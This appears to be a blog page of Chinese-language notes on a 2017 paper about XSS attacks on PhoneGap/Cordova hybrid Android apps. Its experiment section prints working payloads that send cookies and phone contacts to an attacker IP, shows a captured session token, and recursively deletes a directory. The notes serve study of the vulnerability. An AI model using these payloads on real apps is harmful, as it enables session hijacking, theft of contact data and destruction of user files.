<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.145.0"><meta name=generator content="Relearn 7.6.0+b932d301d7838f3c1a50e318e216b55ce5cc9148"><meta name=description content="Cross-site Scripting Attacks on Android Hybrid Applications :::info Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61). :::
這一篇論文雖然很舊了，但還是蠻有趣的
Introduction 他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣
Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用 為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。 在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。 Background What is PhoneGap? 上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。 Proposed Method How XSS attack success on PhoneGap’s App? 有兩種方是可以達成這個攻擊 首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的 在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。"><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="Cross-site Scripting Attacks on Android Hybrid Applications :: SBK Hugo Site"><meta name=twitter:description content="Cross-site Scripting Attacks on Android Hybrid Applications :::info Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61). :::
這一篇論文雖然很舊了，但還是蠻有趣的
Introduction 他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣
Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用 為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。 在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。 Background What is PhoneGap? 上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。 Proposed Method How XSS attack success on PhoneGap’s App? 有兩種方是可以達成這個攻擊 首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的 在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。"><meta property="og:url" content="https://bernie6401.github.io/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/index.html"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Cross-site Scripting Attacks on Android Hybrid Applications :: SBK Hugo Site"><meta property="og:description" content="Cross-site Scripting Attacks on Android Hybrid Applications :::info Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61). :::
這一篇論文雖然很舊了，但還是蠻有趣的
Introduction 他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣
Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用 為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。 在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。 Background What is PhoneGap? 上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。 Proposed Method How XSS attack success on PhoneGap’s App? 有兩種方是可以達成這個攻擊 首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的 在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="Survey Papers"><meta property="article:tag" content="Meeting Paper"><meta property="article:tag" content="NTU"><meta itemprop=name content="Cross-site Scripting Attacks on Android Hybrid Applications :: SBK Hugo Site"><meta itemprop=description content="Cross-site Scripting Attacks on Android Hybrid Applications :::info Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61). :::
這一篇論文雖然很舊了，但還是蠻有趣的
Introduction 他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣
Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用 為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。 在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。 Background What is PhoneGap? 上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。 Proposed Method How XSS attack success on PhoneGap’s App? 有兩種方是可以達成這個攻擊 首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的 在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。"><meta itemprop=wordCount content="239"><meta itemprop=keywords content="Meeting Paper,NTU"><title>Cross-site Scripting Attacks on Android Hybrid Applications :: SBK Hugo Site</title>
<link href=/fonts/fontawesome/css/fontawesome-all.min.css?1743619851 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=/fonts/fontawesome/css/fontawesome-all.min.css?1743619851 rel=stylesheet></noscript><link href=/css/perfect-scrollbar/perfect-scrollbar.min.css?1743619851 rel=stylesheet><link href=/css/theme.min.css?1743619851 rel=stylesheet><link href=/css/format-html.min.css?1743619851 rel=stylesheet id=R-format-style><link href=/css/auto-complete/auto-complete.min.css?1743619851 rel=stylesheet><script src=/js/auto-complete/auto-complete.min.js?1743619851 defer></script><script src=/js/lunr/lunr.min.js?1743619851 defer></script><script src=/js/lunr/lunr.stemmer.support.min.js?1743619851 defer></script><script src=/js/lunr/lunr.multi.min.js?1743619851 defer></script><script src=/js/lunr/lunr.en.min.js?1743619851 defer></script><script src=/js/search.min.js?1743619851 defer></script><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/survey-papers/android-&#43;-security/cross-site-scripting-attacks-on-android-hybrid-applications/index.html",window.relearn.relBasePath="../../..",window.relearn.relBaseUri="../../..",window.relearn.absBaseUri="https://bernie6401.github.io",window.relearn.contentLangs=["en"],window.relearn.index_js_url="/searchindex.en.js?1743619851",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.relearn.themevariants=["auto"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant(),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`</script></head><body class="mobile-support html" data-url=/survey-papers/android-&amp;#43;-security/cross-site-scripting-attacks-on-android-hybrid-applications/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><button class=topbar-control onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><button class=topbar-control onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#background>Background</a></li><li><a href=#proposed-method>Proposed Method</a></li><li><a href=#experiment>Experiment</a><ul><li><a href=#cookie-stealing-and-session-hijacking>Cookie Stealing and Session Hijacking</a></li><li><a href=#steal-contact-data>Steal Contact Data</a></li><li><a href=#delete-files>Delete Files</a></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=/index.html><span itemprop=name>SBK Hugo Site</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=/survey-papers/index.html><span itemprop=name>Survey Papers</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>Cross-site Scripting Attacks on Android Hybrid Applications</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/survey-papers/android-+-security/a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications/index.html title="A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications (🡐)"><i class="fa-fw fas fa-chevron-left"></i></a></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/survey-papers/ml-dl-+-security/deepcase-semi-supervised-contextual-analysis-of-security-events---notes/index.html title="DEEPCASE Semi-Supervised Contextual Analysis of Security Events - Notes (🡒)"><i class="fa-fw fas fa-chevron-right"></i></a></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><button class=topbar-control onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable survey-papers" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline><div class="R-taxonomy taxonomy-tags cstyle tags" title=Tags style=--VARIABLE-TAGS-BG-color:var(--INTERNAL-TAG-BG-color)><ul><li><a class=term-link href=/tags/meeting-paper/index.html>Meeting Paper</a></li><li><a class=term-link href=/tags/ntu/index.html>NTU</a></li></ul></div></header><h1 id=cross-site-scripting-attacks-on-android-hybrid-applications>Cross-site Scripting Attacks on Android Hybrid Applications</h1><h1 id=cross-site-scripting-attacks-on-android-hybrid-applications>Cross-site Scripting Attacks on Android Hybrid Applications</h1><p>:::info
Bao, W., Yao, W., Zong, M., & Wang, D. (2017, March). Cross-site scripting attacks on android hybrid applications. In Proceedings of the 2017 International Conference on Cryptography, Security and Privacy (pp. 56-61).
:::</p><p>這一篇論文雖然很舊了，但還是蠻有趣的</p><h2 id=introduction>Introduction</h2><p>他在講的是現在市面上的App通常會用一些像是Apache Cordova(早期叫做PhoneGap)這類型的Hybrid框架製作一款App，但是PhoneGap的做法是利用WebView渲染畫面，因此就勢必會出現XSS相關的攻擊，這一篇論文就是在探討如何達成攻擊，以及受害範圍有多廣</p><ul><li>Gartner 的一份報告稱，Hybrid App在基於 HTML5 的 Web App和本機 App之間提供了平衡，到 2016 年，將在超過 50% 的行動 App中使用</li><li>為了美化 UI 並在 JavaScript 程式碼中使用行動裝置的原生功能，Hybrid App必須包含第三方元件，而且它們的程式碼可能不可靠。</li><li>在本文的其餘部分，我們首先對WebView和PhoneGap框架的漏洞進行深入分析。 然後根據我們日常生活中行動應用的使用場景，建立了XSS攻擊混合應用的一般流程。 攻擊結果表明，對Hybrid App的 XSS 攻擊可能會對使用者的行動裝置造成更大的破壞性結果。</li></ul><h2 id=background>Background</h2><ul><li>What is PhoneGap?
<a href=#R-image-1da0b027431ea13d7298fc8b7202023a class=lightbox-link><img alt=圖片 class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rJsdoZWX0.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1da0b027431ea13d7298fc8b7202023a><img alt=圖片 class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rJsdoZWX0.png></a>
上圖顯示了PhoneGap App的架構以及如何和device component互動，當Hybrid App的某個功能需要使用 PhoneGap API 時， App可以使用 JavaScript 程式碼呼叫 API，然後 App中的特殊層將 PhoneGap API 呼叫轉換為適合幕後特定功能的device API。</li></ul><h2 id=proposed-method>Proposed Method</h2><ul><li>How XSS attack success on PhoneGap&rsquo;s App?
<a href=#R-image-839f8f0b97f4af83352d068e11eddc64 class=lightbox-link><img alt=圖片 class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SyPtsW-7R.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-839f8f0b97f4af83352d068e11eddc64><img alt=圖片 class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SyPtsW-7R.png></a>
有兩種方是可以達成這個攻擊<ul><li>首先從上圖可以知道，外部的資料有很多種型態，可能是一般文字、QRcode、藍牙等等媒介，而當傳送的資料出現malicious code的時候，PhoneGap Interface的App就會接收這些有問題的資料，並且直接被WebView所render，此時attacker就可以直接根據傳送的payload達到竊取機敏資料的目的<blockquote><p>在使用者的幫助下注入程式碼。 當使用者開啟將行動裝置連接到外界的通道時，將提供存取權限以允許來自另一個裝置的攻擊。 惡意程式碼是透過在不知不覺中與另一個裝置互動來注入的，然後按照與第一個裝置類似的流程來實現攻擊。</p></blockquote></li><li>另外一種則是直接嵌入有問題的code在網頁中，等到使用者瀏覽這個網頁的時候就會被PhoneGap的WebView所Render，達成和上面一樣的效果，類似傳統的攻擊，受害範圍則是cookies, session hijacking, location leaking&mldr;，用的function是<code>document.cookie</code>, <code>write()</code>, <code>appendChilld()</code>, <code>script</code> tag</li></ul></li></ul><h2 id=experiment>Experiment</h2><p>作者提到，為了分析一些可能受到XSS攻擊的應用場景，這些 App都是使用PhoneGap框架開發的混合 App。 由於Google Play提供的大部分PhoneGap App要麼沒有使用某些存在漏洞的PhoneGap插件，要麼不顯示攻擊效果，因此很難使用真實的 App進行演示。 因此，他們demo了對他們自己的PhoneGap App的攻擊</p><h3 id=cookie-stealing-and-session-hijacking>Cookie Stealing and Session Hijacking</h3><p>作者把malicious code插在簡單的comment management system中，這個App是PhoneGap Framework做的，而且有storage XSS漏洞。如果這個 App是基於native language的，那麼JavaScript code將永遠不會被執行。 但是，在此 PhoneGap App中，如果 App使用任何易受攻擊的 API 來顯示評論，則程式碼將在 WebView 內執行。
<a href=#R-image-580ff67f8c5e5bb097a0c95d0bd01137 class=lightbox-link><img alt=圖片1 class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SJ6ehb-mR.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-580ff67f8c5e5bb097a0c95d0bd01137><img alt=圖片1 class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SJ6ehb-mR.png></a></p><ul><li>左邊的圖片:<div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre></div>網頁沒有任何異常情況下，作者只使用"append()" API為網頁新增註解。 透過JQuery API顯示評論字段，然後同時觸發注入的程式碼。 顯然，&ldquo;append()&rdquo; API 並不安全。 &ldquo;innerHTML&rdquo; API 比"append()&ldquo;更安全，並且不會運行"script"標籤內的程式碼，因此作者可以使用"innerHTML&rdquo; API 來替換。</li><li>中間的圖片:
這就是用替換成innerHTML的結果，會發現這次的攻擊就沒有成功</li><li>右邊的圖片:<div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror= &#34;alert(document.cookie )&#34;&gt;</code></pre></div>但我們還是可以改變payload，讓攻擊可以成功，也就是用上述提到的第二列payload，結果就會如最右邊的截圖</li></ul><hr><p>當然我們也可以嘗試把得到的敏感資訊透過第三個payload傳出去給attacker，得到的response如下</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror= &#34;new Image().src=&#39;http://10.103.30.97:80/cookies/attacker.php?cookie=&#39;%2bdocument.cookie&#34;&gt;</code></pre></div><p><a href=#R-image-00fecbbcf5f077935534dd41de344ec5 class=lightbox-link><img alt=圖片 class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HJ9W2WZmC.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-00fecbbcf5f077935534dd41de344ec5><img alt=圖片 class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HJ9W2WZmC.png></a>
Attacker&rsquo;s Server Receive:</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-! data-lang=!>http://10.103.30.97/cookies/manage.php?name=Admin&amp;token=e3afed0047b08059d0fada10f400c1e5</code></pre></div><h3 id=steal-contact-data>Steal Contact Data</h3><p>這次攻擊的標的是QRcode，我們可以把惡意的code嵌入在QRcode當中，如果有利用PhoneGap的App掃描到這個QRcode，因為他是在WebView中進行render，所以這個malicious code會被triggered，這個App使用的是<code>phonegap-plugin-barcodescanner</code>這個plugin，當程式碼顯示時，<code>img</code>的<code>onerror</code>事件將會被觸發，然後使用者的聯絡資料將會傳送給攻擊者。</p><ul><li>Attack Pattern<div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror=
    &#34;navigator.contacts.find([&#39;displayName&#39;,&#39;phoneNumbers&#39;],
    function(c){
    r=&#39;&#39;;
        for(i=0;c[i];i++){
            if(c[i].phoneNumbers&amp;&amp;c[i].phoneNumbers.length){
                r+=c[i].displayName+c[i].phoneNumbers[0].value+&#39;\n&#39;;
        }}
        alert(r);
    new Image().src=&#39;http://10.103.30.97/c.php?d=&#39;+r; })&#34; &gt;</code></pre></div></li></ul><p>如果是用Native Language寫的App就會如左邊的圖片那樣只有顯示這個QRcode儲存的資訊，但如果是用PhoneGap寫的App，經過WebView render出來的結果，就會顯示手機的聯絡人資訊。他是用<code>navigator.contacts.find</code>這個API去呼叫PhoneGap的聯絡人plugin的Java code來搜尋使用者的聯絡人
<a href=#R-image-60b40246ec55138d5b3a70aa2fde093c class=lightbox-link><img alt=圖片2 class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/B158hZWmR.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-60b40246ec55138d5b3a70aa2fde093c><img alt=圖片2 class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/B158hZWmR.png></a></p><h3 id=delete-files>Delete Files</h3><p>這一次換成利用藍牙這個標的達成攻擊，原文提到:</p><blockquote><p>一般來說，如果一個應用程式具有藍牙傳輸功能，它必須能夠讀取和寫入用戶行動裝置上的文件</p></blockquote><p>為了demo攻擊的效果，作者使用<code>cordova-plugin-bluetooth-serial</code>插件和<code>cordova-plugin-file</code>插件開發了一個PhoneGap應用程式。藍牙裝置的名稱是透過<code>innerHTML</code>API顯示的，安全性不夠，攻擊者可以將藍牙裝置的名稱更改為惡意程式碼來實現攻擊。 並且與前兩種設計類似的是再次使用了<code>onerror</code>事件。</p><ul><li>Attack Pattern<div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-javascript! data-lang=javascript!>&lt;img src=x onerror=
    &#34;window.requestFileSystem(LocalFileSystem.PERSISTENT,0
    ,function(f){
        f.root.getDirectory(&#39;ID_5&#39;,null,
            function (e){
                e.removeRecursively(
                    function(){
                        alert(&#39;Delete ID_5 Success!&#39;)
                },null); },null); },null);&#34;&gt;</code></pre></div></li></ul><p>同樣的如果用native app進行連線，就不會遇到攻擊的問題(如左圖)，但如果是用右圖的PhoneGap設計的App，<code>window.requestFileSystem()</code>要求系統存取根檔案系統並傳回一個對象，該物件儲存在<code>FileSystem</code>變數f中。 它的 root 屬性包含一個<code>DirectoryEntry</code>對象，表示目前檔案系統的根目錄。 所以我們使用<code>f.root.getDirectory()</code>來搜尋根目錄中的<code>ID_5</code>目錄。 當找到目錄時，將回傳值儲存在<code>DirectEntry</code>物件e中，並呼叫第5行至第9行中的回呼函數。 然後<code>ID_5</code>目錄的<code>DirectEntry</code>物件呼叫其名為<code>removeRecurively()</code>的方法來刪除<code>ID_5</code>中的所有檔案。 第8行，右圖顯示指定目錄刪除成功的通知。
<a href=#R-image-8d052f34894eef7ddb604542874e94bc class=lightbox-link><img alt=圖片3 class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rkNt3--mR.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-8d052f34894eef7ddb604542874e94bc><img alt=圖片3 class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rkNt3--mR.png></a></p><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=/index.html><div class=logo-title>SBK Hugo Site</div></a></div><search><form action=/search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-id=/index.html><a class=padding href=/index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li data-nav-id=/books-notes/index.html><a class=padding href=/books-notes/index.html>Books Notes</a><ul id=R-subsections-0771445a148f63eb6cc1a9b7ad45a36a class=collapsible-menu></ul></li><li data-nav-id=/data-structure/index.html><a class=padding href=/data-structure/index.html>Data Structures</a><ul id=R-subsections-58892abc7cea06bf1839098c82b3eb4d class=collapsible-menu></ul></li><li data-nav-id=/job/index.html><a class=padding href=/job/index.html>Jobs</a><ul id=R-subsections-0fce2c1f4d6d23f49b605855a82f55aa class=collapsible-menu></ul></li><li data-nav-id=/knowledge/index.html><a class=padding href=/knowledge/index.html>Knowledges</a><ul id=R-subsections-0bdb754d722e03f187f2117c1ef8015d class=collapsible-menu></ul></li><li data-nav-id=/leetcode/index.html><a class=padding href=/leetcode/index.html>LeetCodes</a><ul id=R-subsections-76e85062179d09303530c47eb73fc667 class=collapsible-menu></ul></li><li data-nav-id=/problem-solutions/index.html><a class=padding href=/problem-solutions/index.html>Problem Solutions</a><ul id=R-subsections-4f9e0f3095337026c1723515d5409f89 class=collapsible-menu></ul></li><li data-nav-id=/security/index.html><a class=padding href=/security/index.html>Securities</a><ul id=R-subsections-66815ecaaecfc1c209e5637d03b258b2 class=collapsible-menu></ul></li><li data-nav-id=/side-project/index.html><a class=padding href=/side-project/index.html>Side Projects</a><ul id=R-subsections-3295de6e89859c4cf23a4292e734c881 class=collapsible-menu></ul></li><li class=parent data-nav-id=/survey-papers/index.html><a class=padding href=/survey-papers/index.html>Survey Papers</a><ul id=R-subsections-baa5a308e222e800d6e93248dad73a11 class=collapsible-menu><li data-nav-id=/survey-papers/android-+-security/a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-apps-of-power-industry/index.html><a class=padding href=/survey-papers/android-+-security/a-mitm-based-penetration-test-efficiency-improvement-approach-for-traffic-encrypted-mobile-apps-of-power-industry/index.html>A MITM Based Penetration Test Efficiency Improvement Approach for Traffic-Encrypted Mobile Apps of Power Industry</a></li><li data-nav-id=/survey-papers/android-+-security/a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications/index.html><a class=padding href=/survey-papers/android-+-security/a-mitmproxy-based-dynamic-vulnerability-detection-system-for-android-applications/index.html>A Mitmproxy-based Dynamic Vulnerability Detection System For Android Applications</a></li><li class=active data-nav-id=/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/index.html><a class=padding href=/survey-papers/android-+-security/cross-site-scripting-attacks-on-android-hybrid-applications/index.html>Cross-site Scripting Attacks on Android Hybrid Applications</a></li><li data-nav-id=/survey-papers/ml-dl-+-security/deepcase-semi-supervised-contextual-analysis-of-security-events---notes/index.html><a class=padding 